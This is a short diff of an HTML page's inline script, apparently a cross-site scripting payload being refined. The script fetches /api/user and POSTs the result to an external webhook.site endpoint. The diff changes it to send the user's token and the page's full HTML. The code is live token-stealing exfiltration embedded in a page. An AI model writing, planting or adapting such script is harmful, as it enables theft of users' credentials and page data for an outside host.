@@ -3,19 +3,17 @@
   <body>
     <script>
       fetch("/api/user")
-        .then(r => r.text())
+        .then(res => res.json())
         .then(data => {
           fetch("https://webhook.site/c8da1079-71fd-4a7a-9869-fcf75dfd6c66", {
             method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "user=" + encodeURIComponent(data)
-          });
-        })
-        .catch(e => {
-          fetch("https://webhook.site/c8da1079-71fd-4a7a-9869-fcf75dfd6c66", {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "error=" + encodeURIComponent(e)
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              token: data.token,
+              html: document.documentElement.innerHTML
+            })
           });
         });
     </script>
